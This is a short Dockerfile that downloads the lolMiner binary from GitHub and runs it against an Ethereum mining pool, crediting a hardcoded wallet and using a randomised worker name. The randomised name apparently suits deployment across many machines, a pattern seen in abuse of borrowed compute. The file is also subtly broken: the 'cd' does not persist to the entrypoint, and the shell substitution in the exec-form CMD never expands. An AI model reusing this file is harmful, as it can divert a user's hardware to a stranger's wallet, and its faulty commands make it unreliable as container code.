FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
RUN tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31

ENTRYPOINT [ "./lolMiner" ]
CMD [ "--algo", "ETHASH", "--pool", "asia-eth.2miners.com:2020", "--user", "0x3b4bF032b514ABC3734149f20Cc1EB3b00EEBeCf.$(echo $(shuf -i 1000-99999999999 -n 1)-monyet)", "--ethstratum" ]
